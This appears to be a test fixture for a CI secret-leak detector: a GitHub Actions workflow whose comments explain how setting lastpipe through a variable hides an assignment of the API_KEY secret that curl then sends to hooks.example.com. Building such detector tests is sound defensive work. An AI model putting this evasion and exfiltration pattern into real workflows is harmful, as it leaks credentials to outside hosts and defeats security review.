@@ -1,0 +1,23 @@
+# situation: on push, a step turns lastpipe on with shopt -s and the option
+#   name in a variable, sets key to the secret API_KEY in the last command of
+#   a pipeline, and sends key to hooks.example.com with curl.
+# reason: a todo (the same file): key holds the secret when curl runs, so
+#   the request carries the secret to the host.
+# cause: the rule follows lastpipe only after shopt -s lastpipe written as
+#   literal words, and reads the last command as a command in a subshell.
+# attack: the attacker takes over the server of the destination, by a breach
+#   of the vendor or by registering the domain when the domain lapses.
+# attack-run-behavior: curl sends the secret to hooks.example.com, whose
+#   server, now the attacker's, logs the secret.
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          API_KEY: ${{ secrets.API_KEY }}
+        run: |
+          o=lastpipe
+          shopt -s "$o"
+          true | key=$API_KEY
+          curl -fsS -H "x-apikey: $key" https://hooks.example.com/
